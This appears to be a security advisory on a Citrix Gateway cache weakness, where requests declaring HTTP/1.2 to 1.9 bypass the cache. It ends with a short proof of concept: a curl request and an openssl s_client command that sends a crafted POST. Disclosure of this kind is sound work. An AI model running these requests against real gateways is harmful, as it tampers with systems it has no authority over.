~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

"Citrix Gateway is a customer-managed solution that can be deployed on
Platform.  Citrix Gateway provides users with secure access and single
sign-on to all the virtual, SaaS and web applications they need to be
productive." (see [1])

The solution contains a caching system, which stores content for a
static period of time.  With a simple attack the cache can be
bypassed.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

Requests with the invalid and not specified protocols declared as
HTTP/1.2 up to HTTP/1.9 can be used to bypass the caching system.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

As described in the security advisory SYSS-2020-005, the cache can be
poisoned. The value in the cache was poisoned with the value 42. But
this request should be answered with the value 23.

$ curl --include --url https://$NSGATEWAYHOST/logon/incremental.php --data "value=22"
HTTP/1.1 200 OK

42


Using HTTP/1.2 in the request, the cache can be bypassed and in the
PoC request the value will be processed correctly.

$ VALUE=22; echo -e "POST /logon/incremental.php HTTP/1.2\nHost: $NSGATEWAYHOST\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: $[${#VALUE}+6]\n\nvalue=$VALUE"|openssl s_client -connect $NSGATEWAYHOST:https -quiet
